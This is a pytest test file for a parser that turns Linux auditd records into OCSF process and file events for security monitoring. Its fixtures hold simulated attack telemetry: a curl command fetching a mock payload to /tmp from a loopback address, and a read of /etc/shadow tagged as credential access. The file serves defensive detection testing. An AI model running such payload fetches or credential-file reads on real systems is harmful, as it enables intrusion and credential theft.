"""Tests for Linux auditd -> OCSF parser."""
from __future__ import annotations

import pytest

from app.services import normalizer
from app.services.parsers.auditd_to_ocsf import AuditdParseError, parse_execve, parse_file_watch


@pytest.fixture
def execve_sample() -> dict:
    """Auditd EXECVE fixture reconstructing curl payload transfer command line."""
    return {
        "type": "EXECVE",
        "argc": 5,
        "a0": "curl",
        "a1": "-s",
        "a2": "http://127.0.0.1:9/mock/payload.enc",
        "a3": "-o",
        "a4": "/tmp/p.enc",
        "exe": "/usr/bin/curl",
        "auid": "sysops",
        "host": "target-web-01",
        "time": "2026-01-15T02:00:30+00:00",
        "serial": "9001",
    }


@pytest.fixture
def file_watch_sample() -> dict:
    """Auditd file watch fixture hitting sensitive /etc/shadow read."""
    return {
        "key": "cred_access",
        "path": "/etc/shadow",
        "pid": 1420,
        "exe": "/bin/cat",
        "success": "yes",
        "user": "sysops",
        "host": "target-web-01",
        "time": "2026-01-15T02:14:00+00:00",
        "serial": "9002",
    }


def test_auditd_execve_values_correct(execve_sample):
    """Verify parse_execve accurately reconstructs cmd_line in order and populates Process Activity."""
    result = parse_execve(execve_sample, site_id="site-01", scenario_id="SCENARIO_1_SSH_COMPROMISE")

    # Value-level assertions
    expected_cmd = "curl -s http://127.0.0.1:9/mock/payload.enc -o /tmp/p.enc"
    assert result["process"]["cmd_line"] == expected_cmd
    assert result["process"]["name"] == "curl"
    assert result["process"]["file"]["path"] == "/usr/bin/curl"
    assert result["user"]["name"] == "sysops"
    assert result["device"]["hostname"] == "target-web-01"
    assert result["event_id"] == "AUDITD-9001"
    assert result["time"] == "2026-01-15T02:00:30+00:00"

    # OCSF schema assertions
    assert result["class_uid"] == 1007
    assert result["category_uid"] == 1
    assert result["event_class"] == "process_activity"

    # Normalizer compatibility
    norm_event = normalizer.normalize(result)
    assert norm_event.event_class == "process_activity"
    assert norm_event.process_json.get("cmd_line") == expected_cmd


def test_auditd_file_watch_values_correct(file_watch_sample):
    """Verify parse_file_watch populates File Activity (1001) with correct values."""
    result = parse_file_watch(file_watch_sample, site_id="site-01", scenario_id="SCENARIO_2_INSIDER_MISUSE")

    # Value-level assertions
    assert result["file"]["path"] == "/etc/shadow"
    assert result["file"]["name"] == "shadow"
    assert result["user"]["name"] == "sysops"
    assert result["device"]["hostname"] == "target-web-01"
    assert result["event_id"] == "AUDITD-WATCH-9002"
    assert result["time"] == "2026-01-15T02:14:00+00:00"
    assert result["severity_id"] == 4  # cred_access elevates to 4 (high)

    # OCSF schema assertions
    assert result["class_uid"] == 1001
    assert result["category_uid"] == 1
    assert result["event_class"] == "file_activity"

    # Normalizer compatibility
    norm_event = normalizer.normalize(result)
    assert norm_event.event_class == "file_activity"
    assert norm_event.destination_json == {}


@pytest.mark.parametrize(
    "malformed_record,error_match",
    [
        (
            # Missing an argument in argc sequence (argc=3 but a2 missing)
            {"argc": 3, "a0": "bash", "a1": "-c", "exe": "/bin/bash", "auid": "root", "time": "2026-01-15T02:00:00Z", "serial": "1"},
            "Missing argument 'a2'",
        ),
        (
            # Missing exe and args
            {"auid": "root", "time": "2026-01-15T02:00:00Z", "serial": "1"},
            "Missing executable arguments",
        ),
        (
            # Missing user/auid
            {"argc": 1, "a0": "whoami", "exe": "/usr/bin/whoami", "time": "2026-01-15T02:00:00Z", "serial": "1"},
            "Missing user/auid/uid",
        ),
        (
            # Missing timestamp
            {"argc": 1, "a0": "ls", "exe": "/bin/ls", "auid": "root", "serial": "1"},
            "Missing timestamp",
        ),
        (
            # Invalid timestamp
            {"argc": 1, "a0": "ls", "exe": "/bin/ls", "auid": "root", "time": "not-valid-time", "serial": "1"},
            "Invalid timestamp format",
        ),
        (
            # Missing event identifier
            {"argc": 1, "a0": "ls", "exe": "/bin/ls", "auid": "root", "time": "2026-01-15T02:00:00Z"},
            "Missing event identifier",
        ),
        (
            # Empty dict
            {},
            "must be a non-empty dictionary",
        ),
        (
            # None
            None,
            "cannot be None",
        ),
        (
            # Unsupported type
            42,
            "must be a non-empty dictionary",
        ),
    ],
)
def test_parse_execve_malformed_input_raises_exception(malformed_record, error_match):
    """Assert malformed execve records raise AuditdParseError."""
    with pytest.raises(AuditdParseError, match=error_match):
        parse_execve(malformed_record)


@pytest.mark.parametrize(
    "malformed_record,error_match",
    [
        (
            # Missing path
            {"user": "root", "time": "2026-01-15T02:00:00Z", "serial": "1"},
            "Missing required file 'path' or 'name'",
        ),
        (
            # Missing user
            {"path": "/etc/shadow", "time": "2026-01-15T02:00:00Z", "serial": "1"},
            "Missing required user/auid/uid",
        ),
        (
            # Missing timestamp
            {"path": "/etc/shadow", "user": "root", "serial": "1"},
            "Missing timestamp",
        ),
        (
            # Missing event identifier
            {"path": "/etc/shadow", "user": "root", "time": "2026-01-15T02:00:00Z"},
            "Missing event identifier",
        ),
        (
            # None
            None,
            "cannot be None",
        ),
        (
            # Empty dict
            {},
            "must be a non-empty dictionary",
        ),
    ],
)
def test_parse_file_watch_malformed_input_raises_exception(malformed_record, error_match):
    """Assert malformed file watch records raise AuditdParseError."""
    with pytest.raises(AuditdParseError, match=error_match):
        parse_file_watch(malformed_record)
